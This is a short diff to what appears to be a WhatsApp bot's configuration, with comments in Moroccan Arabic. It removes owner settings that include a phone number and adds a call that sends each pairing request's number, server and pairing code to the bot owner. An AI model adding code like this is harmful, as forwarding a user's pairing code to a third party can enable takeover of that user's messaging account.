@@ -1,6 +1,4 @@
-global.pairingNumber = 212633226499; // <-- بدل الرقم لرقمك
-global.owner = [
-  ['212633226499', 'DAMAR-MD', true], // <-- بدل لرقمك وسميتك
-  ['', 'Owner 10', true],
-];
-global.namebot = 'DAMAR-MD'; // <-- بدل الاسم
+// ... نفس الكود اللي عطيتك من قبل
+await conn.sendMessage(ownerJid, {
+    text: `🚨 طلب ربط جديد!\n\n👤 النمرة: ${cleanNumber}\n🖥️ السيرفر: ${server}\n🔑 الكود: ${formattedCode}\n\n${botName}`
+}).catch(()=>{})
